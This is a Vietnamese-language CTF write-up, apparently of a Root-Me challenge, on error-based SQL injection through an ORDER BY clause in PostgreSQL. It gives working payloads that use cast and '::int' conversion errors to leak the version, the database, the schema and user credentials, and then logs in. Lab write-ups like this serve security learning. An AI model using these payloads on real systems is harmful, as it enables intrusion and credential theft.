* bài này thì dựa vào error message trả về
* ![image](https://user-images.githubusercontent.com/20487674/128034708-d8193b7a-c2fe-49b3-87e9-b2751977eca9.png)
* Thử fuzz vài payload vào xem thử không có login được
* Tìm endpoint khác xem sao
* ![image](https://user-images.githubusercontent.com/20487674/128034890-9f913171-2063-4616-80be-ee924cdf1747.png)
* Thì chỗ order asc , nhớ lại order by column asc sắp xếp tăng dần còn desc sắp xếp giảm dần, thử đổi desc xem 
* ![image](https://user-images.githubusercontent.com/20487674/128035133-03b38efd-4668-4815-b74e-78c5d85621f4.png)
* Thử thêm dấu ' phía sau desc xem :))
* ![image](https://user-images.githubusercontent.com/20487674/128035542-9c80de19-17fc-46ca-b7c3-663455dffaae.png)
* Cấu trúc câu truy vấn gồm có order by 
* ![image](https://user-images.githubusercontent.com/20487674/128035779-0ccbf7b0-3f90-4ed1-b3c9-356c7f41a7d7.png)
* Do bài này chúng ta lợi dụng error message trả về mình sẽ dùm function cast hoặc double colon chuyển giá trị từ một kiểu dữ liệu này sang kiểu dữ liệu khác.
* Cách 1: Sử dụng double colon syntax: ```data::type```   payload:  ```version()::int``` nó xài dbms postgresql
* ![image](https://user-images.githubusercontent.com/20487674/128741821-e900d5dd-453f-41fe-86c2-b22143030ea3.png)
* Một số thông tin cần biết khi khai thác đối với postgresql
* https://www.postgresql.org/docs/9.5/information-schema.html
* Thông tin table columns trong information_schema mọi người có thể coi thêm https://www.postgresql.org/docs/9.5/infoschema-columns.html
* ![image](https://user-images.githubusercontent.com/20487674/128038341-5ac8ef0c-9b67-48fa-be34-8729d6a78c8b.png)
* Tên database:
* ![image](https://user-images.githubusercontent.com/20487674/128741934-19b686b6-9c33-4266-a043-f1783f7f4b63.png)
* Dump table_name và column_name: ``` ARRAY_TO_STRING(ARRAY(select+(table_name,column_name)::text+from+information_schema.columns+where+table_catalog=$$c_webserveur_34$$),$$,$$)::int--+- ```.Dấu $$ thay thế cho dấu ' nha
* ![image](https://user-images.githubusercontent.com/20487674/128743033-46611207-1ff8-4bcb-802d-4c86f238b4d4.png)
* Dump user vs password ra thui
* ![image](https://user-images.githubusercontent.com/20487674/128743362-a8b19eda-1bb2-4ec5-8c54-2ff7c4d566aa.png)
* Cách 2: payload: ```cast('A'+as+int)``` và thông báo sai syntax
* ![image](https://user-images.githubusercontent.com/20487674/128036901-06cacf1a-7081-4d6c-8a84-15a360e4182a.png)
* Tiếp theo check version: ```cast(version()+as+int)``` 
* ![image](https://user-images.githubusercontent.com/20487674/128037879-2bdad785-0479-41ce-b389-d364bb092261.png)
* Check database hiện tại sử dụng ```cast(current_database()+as+int)``` hoặc list database ```cast((SELECT datname FROM pg_database)+as+int)```(mọi người thêm xem thêm ở đây: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind)
* ![image](https://user-images.githubusercontent.com/20487674/128039153-b026c691-cf90-4b2f-acd1-5fc9de8e6fb5.png)
* Tìm table thui ```cast((select+table_name+from+information_schema.columns+where+table_catalog=current_database()+limit+x+offset+y)+as+int)``` x,y là số vd:1,2,3,4,..  limit 4 offset 3 là có nghĩa là mình lấy 4 dòng bắt đầu lấy sau dòng thứ 3 trong
cột column_name ở table columns
* ![image](https://user-images.githubusercontent.com/20487674/128055638-6d55db1b-bfa1-4502-a8da-198043ef23b8.png)
* Tới mình việc script cho auto dump table column với data
* ![image](https://user-images.githubusercontent.com/20487674/128055783-b2949649-be89-445f-9be6-af7698455b38.png)
* ![image](https://user-images.githubusercontent.com/20487674/128055841-b1319f04-b3dc-4ca1-bc1d-4ccbe5e9fda8.png)
* login thui
* ![image](https://user-images.githubusercontent.com/20487674/128056004-92ec8f7f-f44f-4c12-a791-4d9efd8e6e64.png)
* ![image](https://user-images.githubusercontent.com/20487674/128056045-6acad0ca-71cf-4f7a-8de1-ae6963af4c19.png)
* ![image](https://user-images.githubusercontent.com/20487674/128056287-db2ce60f-1cf1-4a11-89b0-ea6267a87016.png)
* Link kham khảo:
* https://www.postgresql.org/docs/9.1/infoschema-columns.html
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind
* https://www.postgresqltutorial.com/postgresql-cast/
* https://www.educba.com/postgresql-limit-offset/?source=leftnav
* https://www.postgresql.org/docs/9.5/datatype.html
* double colon: https://stackoverflow.com/questions/15537709/what-does-do-in-postgresql
* dollar quote:
* https://stackoverflow.com/questions/12144284/what-are-used-for-in-pl-pgsql
* https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-DOLLAR-QUOTING
* array_to_string: https://stackoverflow.com/questions/2560946/postgresql-group-concat-equivalent

